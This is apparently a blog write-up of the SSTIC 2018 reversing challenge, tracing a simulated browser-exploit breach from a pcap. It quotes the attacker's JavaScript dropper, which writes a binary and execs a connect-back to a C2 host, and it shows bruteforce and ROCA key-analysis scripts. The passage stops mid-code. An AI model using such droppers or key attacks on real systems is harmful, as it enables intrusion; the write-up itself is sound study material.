---
layout: post
title: "SSTIC Challenge 2018"
date: 2018-06-15
---


Prior to [it's annual conference in June](https://www.sstic.org), the French infosec conference `"SSTIC"` release a challenge in April. This challenge is pretty unique since unlike most CTFs, it spans over two months, no teams are allowed only single contestants, and 
there are prizes for "well-crafted" write-ups as well as for the fastest resolutions. And ho, it's usually pretty brutal in terms of difficulty since there is a lot of time allowed to solve it.

This year, the challenge is pretty cheeky regarding the recent "cyber" news : we have an email from a "cyber investigator" from Isofax SAS telling its company network has been breached. Since, they plugged off the infected machine (and obviously plugged it right back after) and therefore lost the backdoor, but its apparently possible to retrieve it from the network trace it left. Enclosed with the email is a `pcap` file.

This year's challenge is unusually short since it only has 4 levels (it is usually around 8-10 levels), and it involved wasm reversing, crypto breaking and hack-backing :

- [Anomaly Detection](#anomaly)
- [Disruptive JavaScript](#javascript)
- [Battle-tested Encryption](#encryption)
- [Nation-state Level Botnet](#botnet)
- [Conclusion](#conclusion)
- [Attack Script](#script)



<!--more-->


### Anomaly

The wireshark `pcap` file enclosed with the email has around 40k packets. There is some network noise in it since it seems the user on the infected machine was browsing some French newspaper (particularly articles about a certain Russian dignitary) during the initial breach. However at the end of the network stream there is approx. 10k packets between the infected machine and a server on a LAN over the port `31337`, indicating a C2 communication. Since the communication is not in clear text, we can safely assume the conversation is encrypted using some custom crypto scheme. Since we do not have access to the client making those requests, let's look elsewhere.

By filtering the network stream on port `80`, some packets pops out :

![SSTIC2018_BrowserExploitNetworkCapture](/assets/SSTIC2018_BrowserExploitNetworkCapture.PNG)

It appears the initial breach was done using a browser exploit. At this point, we located three IPs :

- `192.168.231.123` : infected machine
- `192.168.23.213` : C2 server
- `10.241.20.18` : ExploitKit server

All those IP are private : no point trying to contact them, we have to work with only what we have. The exploit kit server delivers 6 requests over HTTP to the infected client :

- `GET http://10.241.20.18:8080/stage1.js`
- `GET http://10.241.20.18:8080/utils.js`
- `GET http://10.241.20.18:8080/blockcipher.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1`
- `GET http://10.141.20.18:8080/blockcipher.wasm?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1`
- `GET http://10.241.20.18:8080/payload.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1`
- `GET http://10.241.20.18:8080/stage2.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd5`

`stage1.js` is a full blown Javascript exploit targeting Firefox 53 on Linux. It relies on [ phoenex's UAF exploit with Firefox's shared array buffers](https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak) and call this function once it reach native code execution :

```javascript

drop_exec = function(data) {
  rop_mem = new ArrayBuffer(0x10000);

  function write_str(str, offset) {
    var ba = new Uint8Array(rop_mem);
    for(var i=0;i<str.length;i++)
      ba[i+offset] = str.charCodeAt(i);
    ba[i+offset] = 0;
    return i+1;
  }
  
  write_str("/tmp/.f4ncyn0un0urs", 0);
  rop_mem_backstore = leak_arraybuffer_backstore(rop_mem);  
  call_func(open, rop_mem_backstore+0x30, rop_mem_backstore, 0x241, 0x1ff);

  console.log("[+] output file opened")
  
  var dv = new DataView(data);
  dv.getUint8(0);
  
  console.log(leak_arraybuffer_backstore(data).toString(16));

  call_func(write, rop_mem_backstore+0x38, memory.read(rop_mem_backstore+0x30),leak_arraybuffer_backstore(data), data.byteLength);
  call_func(close, rop_mem_backstore+0x38, memory.read(rop_mem_backstore+0x30), 0, 0, 0);

  console.log("[+] wrote data")

  args = ["/tmp/.f4ncyn0un0urs", "-h", "192.168.23.213", "-p", "31337"];
  
  args_addr = rop_mem_backstore + 0x40;
  data_offset = 0x100;
  env_addr = rop_mem_backstore+0x90;
  
  for(var i=0;i<args.length;i++) {      
    memory.write(args_addr + 8*i, rop_mem_backstore + data_offset);
    data_offset += write_str(args[i], data_offset);
  }

  console.log("[+] executing");
  
  call_func(execve, rop_mem_backstore+0x80, rop_mem_backstore, args_addr, env_addr);
}
```

The javascript routine is pretty convoluted since it imply ROPing to call native APIs, but here's a simplified version in C :

```C
void drop_exec(uint8_t *data, size_t data_len)
{
  int cb_fd = open("/tmp/.f4ncyn0un0urs", 0x241, 0x1ff);
  write(cb_fd, data, data_len);
  close(cb_fd);

  execve("/tmp/.f4ncyn0un0urs -h 192.168.23.213 -p 31337");
}
```

NB : "Nounours" is the literal French translation for "teddy bear", so "f4ncyn0un0urs" can be read as "fancy(teddy)bear". Any resemblance to real cyber actors or APTs, living or dead, is purely coincidental.

The `stage1` basically drops an executable on the infected machine and launch a process on it, which works since Firefox is still not sandboxed on Linux. However we have to track where the `data` used to write in the dropped binary comes from.

`stage2.js` is javascript routine fetching an encrypted payload (`payload.js`) and decrypting it on the fly using a custom block crypto :

```javascript
// [...]

async function decryptData(data, password) {
  const salt = data.slice(0, 16);
  let iv = data.slice(16, 32);
  const encrypted = data.slice(32);

  const cipherKey = await deriveKey(salt, password);
  const plaintextBlocks = [];

  // initialize cipher context
  const ctx = Module._malloc(10 * 16);
  const key = Module._malloc(32);
  Module.HEAPU8.set(new Uint8Array(cipherKey), key);
  Module._setDecryptKey(ctx, key);

  // cbc decryption
  const block = Module._malloc(16);

  for (let i = 0; i < encrypted.length / 16; i += 1) {
    const currentBlock = encrypted.slice(16 * i, (16 * i) + 16);
    const temp = currentBlock.slice();

    Module.HEAPU8.set(currentBlock, block);
    Module._decryptBlock(ctx, block);
    currentBlock.set(Module.HEAPU8.subarray(block, block + 16));

    const outputBlock = new Uint8Array(16);
    for (let j = 0; j < outputBlock.length; j += 1) {
      outputBlock[j] = currentBlock[j] ^ iv[j];
    }
    plaintextBlocks.push(outputBlock);
    iv = temp;
  }
  Module._free(block);
  Module._free(ctx);
  Module._free(key);

  const marker = new TextDecoder('utf-8').decode(plaintextBlocks.shift());

  if (marker !== '-Fancy Nounours-') {
    return null;
  }
  const plaintext = new Blob(plaintextBlocks, { type: 'image/jpeg' });
  return plaintext;
}

// [...]

async function decryptAndExecPayload(drop_exec) {
  // getFlag(0xbad);
  const passwordUrl = 'https://10.241.20.18:1443/password?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1';
  const response = await fetch(passwordUrl);
  const blob = await response.blob();
    
  const passwordReader = new FileReader();
  passwordReader.addEventListener('loadend', () => {
    Module.d = d;
      decryptData(deobfuscate(base64DecToArr(payload)), passwordReader.result).then((payloadBlob) => {
  var fileReader = new FileReader();
  fileReader.onload = function() {
      arrayBuffer = this.result;
      drop_exec(arrayBuffer);
  };
    console.log(payloadBlob);
  fileReader.readAsArrayBuffer(payloadBlob);
    });
  });
  passwordReader.readAsBinaryString(blob);
};
```

the `decryptData` function in `stage2.js` use a global javascript object called `Module` implemented in `asm.js` and compiled into wasm. `blockcipher.wasm` is a binary wasm file, but wasm-dis can disassemble it into a text version :

```
& ".\wasm-dis.exe" ".\blockcipher_tmp.wasm"
(module
 (type $0 (func (result i32)))
 (type $1 (func (param i32)))
 (type $2 (func (param i32 i32) (result i32)))
 (type $3 (func (param i32 i32 i32) (result i32)))
 (type $4 (func (param i32) (result i32)))
 (type $5 (func (param i32 i32)))
 (type $6 (func (param i32 i32 i32 i32) (result i32)))
 (type $7 (func))
 (import "env" "memory" (memory $0 256 256))
 (import "env" "DYNAMICTOP_PTR" (global $gimport$1 i32))
 (import "env" "STACKTOP" (global $gimport$2 i32))
 (import "env" "STACK_MAX" (global $gimport$3 i32))
 (import "env" "enlargeMemory" (func $fimport$4 (result i32)))
 (import "env" "getTotalMemory" (func $fimport$5 (result i32)))
 (import "env" "abortOnCannotGrowMemory" (func $fimport$6 (result i32)))
 (import "env" "___setErrNo" (func $fimport$7 (param i32))) (import "env" "_emscripten_asm_const_ii" (func $fimport$8 (param i32 i32) (result i32)))
 (import "env" "_emscripten_memcpy_big" (func $fimport$9 (param i32 i32 i32) (result i32)))
 (global $global$0 (mut i32) (get_global $gimport$1))
 (global $global$1 (mut i32) (get_global $gimport$2))
 (global $global$2 (mut i32) (get_global $gimport$3))
 (global $global$3 (mut i32) (i32.const 0))
 (global $global$4 (mut i32) (i32.const 0))
 (global $global$5 (mut i32) (i32.const 0))
 (data (i32.const 1024) "\dccz [...] 85.S\d0\8d")
 (export "___errno_location" (func $16))
 (export "_decryptBlock" (func $9))
 (export "_free" (func $14))
 (export "_getFlag" (func $12))
 (export "_malloc" (func $13))
 (export "_memcpy" (func $18))
 (export "_memset" (func $19))
 (export "_sbrk" (func $20))
 (export "_setDecryptKey" (func $8))
 (export "establishStackSpace" (func $3))
 (export "getTempRet0" (func $6))
 (export "runPostSets" (func $17))
 (export "setTempRet0" (func $5))
 (export "setThrew" (func $4))
 (export "stackAlloc" (func $0))
 (export "stackRestore" (func $2))
 (export "stackSave" (func $1))
```

`Module` export 3 interesting APIs :

* `_decryptBlock` : decipher a block of data
* `_setDecryptKey` : expand the passkey into a decryption context
* `_getFlag` : this look like the flag for this challenge.

`Module._getflag` is the function to reverse in order to get the flag necessary to validate this level. WebAssembly is a language built upon a stack-machine model, so the disassembly is pretty verbose. Here is the interesting snippet :

```
(func $_getFlag (type $t2) (param $p0 i32) (param $p1 i32) (result i32)
    (local $l0 i32) (local $l1 i32) (local $l2 i32)
    ...
    ...
    get_local $p0
    i32.const 89594904      /* if (secret != 89594904)  */
    i32.ne          

    if $I0          /* { */

      get_local $l1
      set_global $g4
      i32.const 0
      return        /* return null; */

    end           /* } */
    ...
```

This a basic check on the first argument against a constant. We get the flag using the following routine :


```javascript
function getFlag(secret) {
  const flagLen = 43;
  const flagPtr = Module._malloc(flagLen + 1);
  if (Module._getFlag(secret, flagPtr)) {
    console.log("Found flag");
    const flag = Module.HEAPU8.subarray(flagPtr, flagPtr + flagLen);
    console.log(new TextDecoder('utf-8').decode(flag));
  }
  console.log("not found flag");
  Module._free(flagPtr);
}

console.log(getFlag(89594904));
>>> "Found flag"
>>> "SSTIC2018{3db77149021a5c9e58bed4ed56f458b7}"
```



### Javascript

At this point we know the exploit download an encrypted payload and password, and use it to decrypt the payload on the fly. Unlike all the others requests to the ExploitKit server, the decryption password fetch is done over HTTPS, not HTTP. This is the certificate associated with the server :

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 10357056038974559015 (0x8fbba797e9e49327)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=RU, ST=Moscow, O=APT28, CN=legit-news.ru
        Validity
            Not Before: Mar  5 17:00:05 2018 GMT
            Not After : Mar  5 17:00:05 2019 GMT
        Subject: C=RU, ST=Moscow, O=APT28, CN=legit-news.ru
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d4:f5:ba:3a:65:11:0a:87:e9:e7:be:f2:b5:f7:
                    79:9a:2d:9d:97:82:de:ca:93:05:18:f7:ea:47:e9:
                    e6:8d:be:e0:be:e8:1a:b9:4e:92:72:b8:eb:a5:79:
                    79:b8:e7:90:af:01:72:68:8d:c3:23:66:aa:6c:53:
                    59:09:0f:95:6d:25:89:ce:40:1c:54:9b:46:fd:7b:
                    0b:ec:d5:b6:bc:08:b9:bd:bb:af:a2:9c:a3:49:6d:
                    fb:24:5b:bb:40:29:46:09:d2:b5:03:34:c7:df:d1:
                    46:b4:26:ee:11:f9:ad:53:96:4f:e5:79:eb:b4:bc:
                    be:f3:5f:d4:d9:9a:c8:0b:9b:93:48:16:a1:76:4a:
                    48:10:ed:4e:b9:74:1e:23:cc:1e:a9:95:6e:c0:cd:
                    75:59:98:f1:63:fe:ce:83:09:11:b9:ea:5c:af:fe:
                    37:45:fa:ef:25:22:1b:22:a6:00:d2:6b:e5:de:87:
                    75:74:f4:b0:bc:0a:d8:88:11:a3:ee:75:e4:db:8a:
                    27:11:b3:13:8a:08:27:ca:0e:d8:34:7b:95:3c:f2:
                    7b:e4:7b:04:07:03:44:9d:62:6a:b8:45:e1:56:39:
                    d1:20:dd:0d:08:e1:e5:8c:f7:e4:5a:2a:aa:d5:a1:
                    6a:5a:d3:a3:58:35:7e:56:69:d3:82:df:a2:c1:85:
                    43:d1
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                74:99:D0:28:85:49:03:5E:E9:8E:64:D0:5D:3F:81:9E:A0:A0:84:02
            X509v3 Authority Key Identifier:
                keyid:74:99:D0:28:85:49:03:5E:E9:8E:64:D0:5D:3F:81:9E:A0:A0:84:02

            X509v3 Basic Constraints:
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
         84:3f:6b:20:1b:3d:ff:1a:5c:61:c2:f3:31:8d:d1:1e:db:5c:
         9d:bd:c0:71:eb:5a:87:dd:b6:04:ef:4e:16:f8:34:f2:cf:39:
         1c:ce:36:3e:3b:df:48:27:48:b0:11:db:c9:3d:e0:1e:c6:2b:
         d0:16:ab:43:19:c3:02:81:6d:a3:36:76:16:6f:fa:35:57:de:
         02:ed:0e:6a:ba:60:d6:e2:19:03:61:43:0b:b3:21:8c:02:61:
         31:f6:9a:82:6c:0c:9c:d2:f3:84:7a:ef:65:d8:5f:37:4e:1b:
         97:6f:c6:80:dd:c6:0e:ef:24:fa:56:5f:4f:f9:f2:fb:9f:cb:
         9d:bb:8e:ca:e7:e1:38:76:8a:4b:8e:7c:05:17:8c:8e:d7:66:
         8a:d1:a3:76:15:ef:04:81:23:f5:40:ca:9d:d2:dc:af:85:13:
         69:49:49:0b:20:8f:41:e0:20:41:d3:ab:17:ed:8c:f6:66:29:
         c5:c8:c3:e9:25:53:40:eb:84:59:fe:ca:db:4d:89:24:22:6b:
         f3:e9:92:bc:92:75:05:58:c6:0a:09:89:bf:33:fd:e1:d6:68:
         78:be:de:a8:4d:1c:31:f5:5c:77:1b:2b:77:df:e6:64:7b:27:
         f4:de:96:b7:00:e5:5a:01:eb:8e:19:6a:8c:71:81:2b:cc:ae:
         25:e8:c6:1f
-----BEGIN CERTIFICATE-----
MIIDXzCCAkegAwIBAgIJAI+7p5fp5JMnMA0GCSqGSIb3DQEBCwUAMEYxCzAJBgNV
BAYTAlJVMQ8wDQYDVQQIDAZNb3Njb3cxDjAMBgNVBAoMBUFQVDI4MRYwFAYDVQQD
DA1sZWdpdC1uZXdzLnJ1MB4XDTE4MDMwNTE3MDAwNVoXDTE5MDMwNTE3MDAwNVow
RjELMAkGA1UEBhMCUlUxDzANBgNVBAgMBk1vc2NvdzEOMAwGA1UECgwFQVBUMjgx
FjAUBgNVBAMMDWxlZ2l0LW5ld3MucnUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDU9bo6ZREKh+nnvvK193maLZ2Xgt7KkwUY9+pH6eaNvuC+6Bq5TpJy
uOuleXm455CvAXJojcMjZqpsU1kJD5VtJYnOQBxUm0b9ewvs1ba8CLm9u6+inKNJ
bfskW7tAKUYJ0rUDNMff0Ua0Ju4R+a1Tlk/leeu0vL7zX9TZmsgLm5NIFqF2SkgQ
7U65dB4jzB6plW7AzXVZmPFj/s6DCRG56lyv/jdF+u8lIhsipgDSa+Xeh3V09LC8
CtiIEaPudeTbiicRsxOKCCfKDtg0e5U88nvkewQHA0SdYmq4ReFWOdEg3Q0I4eWM
9+RaKqrVoWpa06NYNX5WadOC36LBhUPRAgMBAAGjUDBOMB0GA1UdDgQWBBR0mdAo
hUkDXumOZNBdP4GeoKCEAjAfBgNVHSMEGDAWgBR0mdAohUkDXumOZNBdP4GeoKCE
AjAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCEP2sgGz3/GlxhwvMx
jdEe21ydvcBx61qH3bYE704W+DTyzzkczjY+O99IJ0iwEdvJPeAexivQFqtDGcMC
gW2jNnYWb/o1V94C7Q5qumDW4hkDYUMLsyGMAmEx9pqCbAyc0vOEeu9l2F83ThuX
b8aA3cYO7yT6Vl9P+fL7n8udu47K5+E4dopLjnwFF4yO12aK0aN2Fe8EgSP1QMqd
0tyvhRNpSUkLII9B4CBB06sX7Yz2ZinFyMPpJVNA64RZ/srbTYkkImvz6ZK8knUF
WMYKCYm/M/3h1mh4vt6oTRwx9Vx3Gyt33+Zkeyf03pa3AOVaAeuOGWqMcYErzK4l
6MYf
-----END CERTIFICATE-----
```

The SSL cert and communication seem to be correctly set up, which means we won't be able to retrieve the password from the HTTPS stream. Which means it's probably possible to decrypt the payload without the password.

The password fetched is then derived via PKBFD2/SHA-256 into a 256-bit decryption key, which is fed to an unknown block cipher crypto. Since we assume Firefox crypto implement of PKBFD2 is correct, the crypto vulnerability must be found within the block cipher :

```javascript
async function decryptData(data, password) {
  const salt = data.slice(0, 16);
  let iv = data.slice(16, 32);
  const encrypted = data.slice(32);

  const cipherKey = await deriveKey(salt, password);
  const plaintextBlocks = [];

  // initialize cipher context
  const ctx = Module._malloc(10 * 16);
  const key = Module._malloc(32);
  Module.HEAPU8.set(new Uint8Array(cipherKey), key);
  Module._setDecryptKey(ctx, key);

  // cbc decryption
  const block = Module._malloc(16);

  for (let i = 0; i < encrypted.length / 16; i += 1) {
    const currentBlock = encrypted.slice(16 * i, (16 * i) + 16);
    const temp = currentBlock.slice();

    Module.HEAPU8.set(currentBlock, block);
    Module._decryptBlock(ctx, block);
    currentBlock.set(Module.HEAPU8.subarray(block, block + 16));

    const outputBlock = new Uint8Array(16);
    for (let j = 0; j < outputBlock.length; j += 1) {
      outputBlock[j] = currentBlock[j] ^ iv[j];
    }
    plaintextBlocks.push(outputBlock);
    iv = temp;
  }
  Module._free(block);
  Module._free(ctx);
  Module._free(key);

  const marker = new TextDecoder('utf-8').decode(plaintextBlocks.shift());

  if (marker !== '-Fancy Nounours-') {
    return null;
  }
  const plaintext = new Blob(plaintextBlocks, { type: 'image/jpeg' });
  return plaintext;
}
```

This a CBC-style decryption routine, where all plaintext messages starts with a 128 bits known marker `-Fancy Nounours-`. I've tried to reverse the two wasm routines `Module._setDecryptKey` & `Module._decryptBlock` used here, but it revealed by a really bad idea. I've heard later that the blockcipher algorithm is actually a variant of GOST, a crypto lib famously associated with the Russian digital sphere.

Instead I've played with the decryption context `ctx` and found that :

- It does not change between two rounds (like most decryption contexts)
- the whole 32 bytes of the decryption key is used to generate the decryption context
- bitflipping any of the context's first 16 bytes  has the same bitflip happening on the respective plaintext byte.

Since we know the first 16 bytes of any plaintext data (it's the marker) we can bruteforce the 16 bytes of the decryption key, byte per byte, and use it to decipher the whole payload :

```javascript
async function bruteforceDecryptData(data, password) {
  const salt = data.slice(0, 16);
  let iv = data.slice(16, 32);
  const encrypted = data.slice(32);
  const plaintextBlocks = [];

  /* '-Fancy Nounours-' */
  const markerFancy = [45, 70, 97, 110, 99, 121, 32, 78, 111, 117, 110, 111, 117, 114, 115, 45];
  
  // stubbing cipherKey
  const cipherKey = new Uint8Array(32);//await deriveKey(salt, password);
  cipherKey.fill(0);


  // initialize cipher context
  const ctx = Module._malloc(10 * 16);
  const key = Module._malloc(32);

  Module.HEAPU8.set(new Uint8Array(cipherKey), key);
  Module._setDecryptKey(ctx, key);

  // Overwrite generated context
  const controlledCtx =  new Uint8Array(10*16);
  controlledCtx.fill(0);
  Module.HEAPU8.set(controlledCtx, ctx);

  // cbc decryption
  const block = Module._malloc(16);

  // iterate over 16 bytes of plaintext
  for (var idx = 0; idx < 16; idx++)
  {
    console.log("round " + idx);

    n = 0;
    var foundMatch = false;

    // bruteforce controlledCtx[idx] 
    while (!foundMatch)
    {
      var i = 0;
      controlledCtx[idx] = n;
      Module.HEAPU8.set(controlledCtx, ctx);

      const currentBlock = encrypted.slice(16 * i, (16 * i) + 16);
      const temp = currentBlock.slice();
      iv = data.slice(16, 32);


      Module.HEAPU8.set(currentBlock, block);
      Module._decryptBlock(ctx, block);
      currentBlock.set(Module.HEAPU8.subarray(block, block + 16));

      const outputBlock = new Uint8Array(16);
      for (let j = 0; j < outputBlock.length; j += 1) {
        outputBlock[j] = currentBlock[j] ^ iv[j];
      }

      if (outputBlock[idx] == markerFancy[idx])
      {
        console.log("Found match for idx "+ idx + " : " + n);
        foundMatch = true;
      }
      else {
        if (n > 255) {
          console.log("No match found : ABORT");
          return;
        }
        n += 1;
      }
    }
  }

  console.log("context");
  console.log(controlledCtx.slice(0, 16));
}


>>> "context"
>>> "[ 44, 245, 231, 62, 15, 168, 99, 45, 181, 221, 252, 231, 161, 191, 151, 146 ]"
```

The deciphered binary gives use the flag for this level :

```
strings .f4ncyn0un0urs | grep "SSTIC2018"
SSTIC2018{f2ff2a7ed70d4ab72c52948be06fee20}
```

### Encryption


We finally reconstruct an `ELF` binary that looks like a connect back with a mesh relay baked in (the binary can either act as a client or a server endpoint). Launched with the command line used in the first stage, it connects to the C2 server at `192.168.23.213:31337` and wait for commands. We have network dumps for this communication, but the packets data are encrypted (again !).

The crypto algorithm used here is fairly straightforward :

- the client generate a random 128-bit decoding aes key using `/dev/urandom`
- the client generate temporary 2048-bit rsa keys (`client_priv`, `client_pub`)
- the client send `client_pub` public key to the server
- the server answered with it's own public key `server_pub`
- the client encode it's decoding key with the server pubkey and send it to the server
- the client receive the server's encoding key encrypted with the client pubkey and decrypt it using `client_priv`.
- the client zero every rsa helpers

At the end of the key exchange, both the client and the server has the same 128-bit AES key (`encoding`, `decoding`). They are then expanded into a valid Rijndael context.
These context are used to encrypt messages using AES-CBC 128-bit.

The way primes are generated for the rsa key is a bit strange looking :

```C
// generate a prime big number for (p, q) -> N
__int64 __fastcall genPrimeInfFast(MPZ_RSA_CTXT *a1, mpz_t prime)
{
  __int64 v2; // rdx
  __int64 v3; // rdx
  int v4; // eax
  __int64 v5; // ST00_8
  __int64 random_factor; // [rsp+18h] [rbp-E0h]
  unsigned int mpz[4]; // [rsp+20h] [rbp-D8h]
  unsigned int mpz_bn[4]; // [rsp+30h] [rbp-C8h]
  char op; // [rsp+40h] [rbp-B8h]

  mpz_init(mpz);
  mpz_init(mpz_bn);
  do
  {

    // x = random(62)
    get_random(&op, a1->prime_product_sizeinbase, v2);
    mpz_import(mpz, a1->prime_product_sizeinbase, 1, 1uLL, 1, 0LL, &op);

    // x = ( gen_p**x [M] )
    mpz_powm(mpz_bn, &a1->hardcoded_gen_p, mpz, a1->prime_product);
    
    // y = (rand64() & mask) + 0x189AD793E6A9CE;
    get_random(&random_factor, 8uLL, v3);
    random_factor = (random_factor & 0x7FFFFFFFFFFFFLL) + 0x189AD793E6A9CELL;

    // p = y*M + ( gen_p**x [M] )
    mpz_addmul_ui(mpz_bn, a1, (void *)random_factor);
    
    v4 = mpz_probab_prime_p(mpz_bn, 30);
    v2 = v5;
  }
  while ( !v4 );

  mpz_set(prime, (__int64)mpz_bn);
  mpz_clear(mpz_bn);

  return mpz_clear(mpz);
}
```

The construction greatly resemble the one presented [in the ROCA paper](https://acmccs.github.io/papers/p1631-nemecA.pdf), the attack that impacted Infineon rsa keys in 2017 :

![SSTIC2018_RocaPrime](/assets/SSTIC2018_RocaPrime.PNG)


The generator is custom (it's not 0x10001) and there is a constant (0x189ad793e6a9ce) in the random factor, but it's the same construction. By tweaking the fingerprint tool given by ROCA authors, I was able to verify the client and server public key are vulnerable to factorization :


```python
class DlogFprint(object):
    """
    Discrete logarithm (dlog) fingerprinter for ROCA.
    Exploits the mathematical prime structure described in the paper.

    No external python dependencies are needed (for sake of compatibility).
    Detection could be optimized using sympy / gmpy but that would add significant dependency overhead.
    """
    def __init__(self, max_prime=701, generator=0xf389b455d0e5c3008aaf2d3305ed5bc5aad78aa5de8b6d1bb87edf11e2655b6a8ec19b89c3a3004e48e955d4ef05be4defd119a49124877e6ffa3a9d4d1):
        self.primes = [
            2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43,
            47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103,
            107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163,
            167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227,
            229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281,
            283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353,
            359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421,
            431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487,
            491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569,
            571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631,
            641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701,
        ]

        self.max_prime = max_prime
        self.generator = generator
        self.m, self.phi_m = self.primorial(max_prime)

        self.phi_m_decomposition = DlogFprint.small_factors(self.phi_m, max_prime)
        self.generator_order = DlogFprint.element_order(generator, self.m, self.phi_m, self.phi_m_decomposition)
        self.generator_order_decomposition = DlogFprint.small_factors(self.generator_order, max_prime)
        logger.debug('Dlog fprint data: max prime: %s, generator: %s, m: %s, phi_m: %s, phi_m_dec: %s, '
                     'generator_order: %s, generator_order_decomposition: %s'
                     % (self.max_prime, self.generator, self.m, self.phi_m, self.phi_m_decomposition,
                        self.generator_order, self.generator_order_decomposition))

    def fprint(self, modulus):
        """
        Returns True if fingerprint is present / detected.
        :param modulus:
        :return:
        """
        if modulus <= 2:
            return False

        d = DlogFprint.discrete_log(modulus, self.generator,
                                    self.generator_order, self.generator_order_decomposition, self.m)
        return d is not None

    # ...

client_modulus = 0xa0e1cdfcc3141ec0a071247edf251a4a118dc8789e1c44f5ba63e4b6b3f34210796446575b12bddc0d73ecc3a5b398fcbdc0dcc71b2dfacf01be12500ac6a572f2829d2bfa9af28bf873dc4a299ad8d03345c5ffc9c07a86bdd01c30bbeac413bddd3e928ae86e8c2a2ada44e4f0353e8d2e992446569d96769e405417e821082a196fb5c895d98b6d269214984393617b860b255d1d0c62a5e1f1717bc7772614d87e56732959caea30000d1b5957294e7a5cab70e5988bc1e206e7e6d0ca095f68e3414ece1ddb0e88ce7667cca91b7c988829976e1455f9843a5e7da1a2b36a2a238765e8d5d421876a52eb4e077d862266f7b6b0dda7a1f2d02d430e311d
server_modulus = 0xdf3bc349ea89004a1b5f79028c0a4a63e83b6262cb1c301d77da0d68292bde3f1a38662011d8e3e244912c6eda9e1712d2e694e08d28cf148cacc756150cd0073d67e34ad9e4b8124fdd5527b325be2626a8d468a742d16e7dea738dea66576b92b31eb08b6aa74c8653e597612463059059789abea4ee09010aba67c6d271d68bd0b1255c2eeb5baa92009b6cd4ad6ece8c3fdd60c0c30eacf1c7dd72b0d7ddeef13b33ca65dc6249f725f67d01d3fc9dbf53250e04f294b5fe3074bf28829479983af786b1dd487dd2fbf83056f033f51190a900b03db4741fdafa0512645a4146b0d3cdabfd3b16868a7931e0d2893e5f90c5e614c11ac9012cdbf4025845


gen = 0xf389b455d0e5c3008aaf2d3305ed5bc5aad78aa5de8b6d1bb87edf11e2655b6a8ec19b89c3a3004e48e955d4ef05be4defd119a49124877e6ffa3a9d4d1

d = DlogFprint(max_prime=701, generator = gen)
print("Vulnerable client modulus : %s " % d.fprint(client_modulus))
print("Vulnerable server modulus : %s " % d.fprint(server_modulus))

print("client log : %s " % DlogFprint.discrete_log(client_modulus, d.generator,
                                    d.generator_order, d.generator_order_decomposition, d.m))


>>> "Vulnerable client modulus : True"
>>> "Vulnerable server modulus : True"
>>> "client log : 587381030034937267228671063833644835613165092233489377"
```

Unfortunately, there are only few tools online to play with roca factorization. I've found `neca` ([https://gitlab.com/jix/neca](https://gitlab.com/jix/neca)) and the [sage script from D.J.Berstein](https://blog.cr.yp.to/20171105-infineon.html) and modified it for my needs :

```
$ ./neca 0xdf3bc349ea89004a1b5f79028c0a4a63e83b6262cb1c301d77da0d68292bde3f1a38662011d8e3e244912c6eda9e1712d2e
694e08d28cf148cacc756150cd0073d67e34ad9e4b8124fdd5527b325be2626a8d468a742d16e7dea738dea66576b92b31eb08b6aa74c8653e597612463059059789abea4ee09010aba67c6d271d68bd0b1255c2eeb5
baa92009b6cd4ad6ece8c3fdd60c0c30eacf1c7dd72b0d7ddeef13b33ca65dc6249f725f67d01d3fc9dbf53250e04f294b5fe3074bf28829479983af786b1dd487dd2fbf83056f033f51190a900b03db4741fdafa051
2645a4146b0d3cdabfd3b16868a7931e0d2893e5f90c5e614c11ac9012cdbf4025845
NECA - Not Even Coppersmith's Attack
ROCA weak RSA key attack by Jannis Harder (me@jix.one)

 *** Currently only 512-bit keys are supported ***

 *** OpenMP support enabled ***

N = 28180612165467712922159741083872502900725612511973514107199045247977910616219867219975377860405550130389124311296664557160589721005313573752095567574545409315142199502109440609141091833208010390172923432952433750622974933558390679959535404552176891898090519522560593447595537764874642501937558060391409466037341309106662396189130215844748024471190021145518665667242445766329768468792209211621315884107582733099819404266318594808154455943610238932964590151434412010466289436531687713595755999176137040365616252630864918150375602564646913074649437693817079573412623724606983013843525014455044082497041320891539752376389
Factoring...

[                        ]  0.00% elapsed: 1172s left: 108167624.00s total: 108168792.00s
```

Even though I've tweaked the search parameters, I haven't been able to reduce the total bruteforce time under 1500 days, which is a no-starter for this challenge. That means this path is actually a dead end.
(UPDATED : after seen solutions from other participants, it was totally possible. I just fucked it up somehow.)

There is actually a much simpler vulnerability in the encryption scheme. Below are the pseudo code for encrypting a message

```C
int __fastcall scomm_send(const AGENT_CONTEXT_RIJNDAEL *a1, uint8_t *buffer, int buffer_size)
{
  // [...]

    prev_block = &packet[16];
    plaintext_block = &plaintext_buffer[16 * (padded_count - 1) + 16];
    do
    {
      ct = (uint8_t *)prev_block;      
      prev_block += 16;

      // pt = pt ^ prev_pt
      _packet_buffer[0] ^= prev_block[0];
      _packet_buffer[1] ^= prev_block[1];
      _packet_buffer[2] ^= prev_block[2];
      _packet_buffer[3] ^= prev_block[3];
      _packet_buffer[4] ^= prev_block[4];
      _packet_buffer[5] ^= prev_block[5];
      _packet_buffer[6] ^= prev_block[6];
      _packet_buffer[7] ^= prev_block[7];
